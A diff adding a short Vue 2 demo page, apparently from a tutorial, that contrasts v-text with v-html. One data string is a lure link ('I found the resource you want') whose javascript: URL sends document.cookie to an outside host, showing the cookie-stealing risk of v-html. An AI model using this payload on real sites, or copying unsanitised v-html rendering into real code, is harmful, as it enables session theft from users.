@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>过滤器</title>
+    <script type="text/javascript" src="js/vue.js"></script>
+    <!--dayjs 引入-->
+    <script type="text/javascript" src="js/dayjs.min.js"></script>
+</head>
+<body>
+<div id="root">
+    <h2>显示当前，{{message}}</h2>
+    <h2 v-text="message"></h2>
+    <h3 v-html="url"></h3>
+</div>
+</body>
+<script>
+    Vue.config.productionTip = false;
+    new Vue({
+        el: '#root',
+        data: {
+            message: '内容content',
+            url: '<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>'
+        },
+    });
+</script>
+</html>
